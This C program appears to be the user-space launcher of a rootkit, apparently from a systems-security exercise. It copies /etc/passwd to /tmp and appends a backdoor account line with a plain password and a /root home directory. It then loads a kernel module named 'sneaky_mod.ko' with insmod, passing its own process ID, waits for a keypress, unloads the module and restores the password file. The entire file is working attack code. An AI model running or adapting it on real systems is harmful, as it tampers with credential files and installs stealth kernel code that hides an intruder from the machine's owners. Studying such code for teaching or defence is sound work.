#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/types.h>
#include <sys/wait.h>

void copy_to_new_file(char *src, char *dest)
{
  FILE *ifptr = fopen(src, "r");
  if (ifptr == NULL) {
    perror("error reading file");
    exit(EXIT_FAILURE);
  }
  FILE *ofptr = fopen(dest, "w");
  if (ofptr == NULL) {
    perror("error writing file");
    exit(EXIT_FAILURE);
  }
  char c;
  while ((c = fgetc(ifptr)) != EOF) {
    fputc(c, ofptr);
  }

  fclose(ofptr);
  fclose(ifptr);
}

void add_a_new_line(char *src)
{
  FILE *fptr = fopen(src, "a");
  if (fptr == NULL) {
    perror("error appending /etc/passwd");
    exit(EXIT_FAILURE);
  }
  char *authenticationInfo = "sneakyuser:abc123:2000:2000:sneakyuser:/root:bash";
  fprintf(fptr, "%s", authenticationInfo);
  fclose(fptr);
}

void load_sneaky_module()
{
  pid_t cpid, wpid;
  int wstatus;
  
  /*Step 1: print own process ID */
  int pid_sneaky = getpid();
  printf("sneaky_process pid = %d\n", pid_sneaky);

  cpid = fork();
  if (cpid == -1) {
    perror("fork");
    exit(EXIT_FAILURE);
  } else if (cpid == 0) { // child process
    char argToKernel[100];
    sprintf(argToKernel, "sneaky_process_id=%d", pid_sneaky);
    execlp("insmod", "insmod", "sneaky_mod.ko", argToKernel, NULL);
  } else { // parent process
    wpid = waitpid(cpid, &wstatus, 0);
    if (WIFEXITED(wstatus)) {
      //printf("Program exited with status %d\n", WEXITSTATUS(wstatus));
    } else if (WIFSIGNALED(wstatus)) {
      printf("Program was killed by signal %d\n", WTERMSIG(wstatus));
    }
    /*Step 4: loop and wait until q is pressed*/
    char c;
    while ((c = fgetc(stdin)) != 'q') {}
  }
}

void unload_sneaky_module()
{
  pid_t cpid, wpid;
  int wstatus;

  cpid = fork();
  if (cpid == -1) {
    perror("fork");
    exit(EXIT_FAILURE);
  } else if (cpid == 0) { // child process
    execlp("rmmod", "rmmod", "sneaky_mod.ko", NULL);
  } else { // parent process
    wpid = waitpid(cpid, &wstatus, 0);
    if (WIFEXITED(wstatus)) {
      //printf("Program exited with status %d\n", WEXITSTATUS(wstatus));
    } else if (WIFSIGNALED(wstatus)) {
      printf("Program was killed by signal %d\n", WTERMSIG(wstatus));
    } 
  }
}

int main(void)
{
  char src[] = "/etc/passwd";
  char dest[] = "/tmp/passwd";
  
  /*Step 2: copy file and print a new line to original file*/
  copy_to_new_file(src, dest);
  add_a_new_line(src);
  
  /*Step 3: load the sneaky module*/
  load_sneaky_module();
  
  /*Step 5: unload the sneaky module*/
  unload_sneaky_module();

  /*Step 6: restore /etc/passwd file*/
  copy_to_new_file(dest, src);

  return EXIT_SUCCESS;
}
